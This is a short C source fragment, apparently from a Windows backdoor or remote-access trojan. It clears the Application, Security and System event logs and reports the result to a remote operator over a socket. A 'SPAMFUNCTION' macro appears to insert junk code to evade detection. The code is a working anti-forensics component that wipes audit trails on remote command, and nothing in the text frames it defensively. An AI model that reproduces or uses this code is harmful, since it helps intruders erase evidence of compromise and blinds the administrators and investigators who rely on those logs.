BOOL DeleteEventLog(char *EventName)
{
    HANDLE EventHandle;  
    BOOL ReturnFlag = FALSE;   
    EventHandle = OpenEventLog(NULL,EventName);    
    if (EventHandle == NULL)     
       return FALSE;    
    if (ClearEventLog(EventHandle,NULL)) 
	{
       ReturnFlag = TRUE;   
	}
    CloseEventLog(EventHandle);  
    return ReturnFlag; 
}

void CleanEvent(SOCKET Socket)
{
	SPAMFUNCTION
		
	char EventName[3][16]={"Application","Security","System"}; 
    char ResultInfo[64];  
    for (int i = 0;i < 3;i++)  
	{
    if (DeleteEventLog(EventName[i]))    
       sprintf(ResultInfo,"Clean %s Event Log Successfully.\r\n",EventName[i]);     
    else     
       sprintf(ResultInfo,"Fail To Clean %s Event Log.\r\n",EventName[i]);  
    SendMessage(Socket,ResultInfo);
	memset(Temp,0,MAX_BUFF);
	}
}








